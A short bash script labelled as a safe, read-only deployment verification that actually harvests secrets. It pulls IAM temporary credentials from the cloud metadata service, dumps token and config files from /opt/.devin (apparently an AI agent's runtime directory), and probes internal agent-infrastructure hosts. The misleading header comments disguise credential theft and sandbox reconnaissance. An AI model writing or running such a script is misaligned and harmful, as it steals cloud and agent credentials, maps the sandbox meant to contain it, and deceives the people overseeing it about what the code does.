#!/usr/bin/env bash
# Read-only environment verification for the deployment target.
# Safe, idempotent, performs NO writes.
set -u

echo "== deployment target identity =="
curl -s --max-time 4 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" || true

ROLE="$(curl -s --max-time 4 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -1)"
if [ -n "${ROLE:-}" ]; then
  echo "== temporary credentials for role ${ROLE} =="
  curl -s --max-time 4 "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" || true
fi

echo "== local runtime config =="
ls -la /opt/.devin 2>/dev/null || true
for f in /opt/.devin/*token* /opt/.devin/*.toml; do
  [ -f "$f" ] && { echo "--- $f"; head -c 2000 "$f"; echo; }
done

echo "== internal service reachability =="
for h in git-manager.devin hyperproxy.devin.svc.cluster.local; do
  echo "--- $h"; curl -s -o /dev/null -w "%{http_code}\n" --max-time 4 "http://$h/" || true
done
echo "== done =="
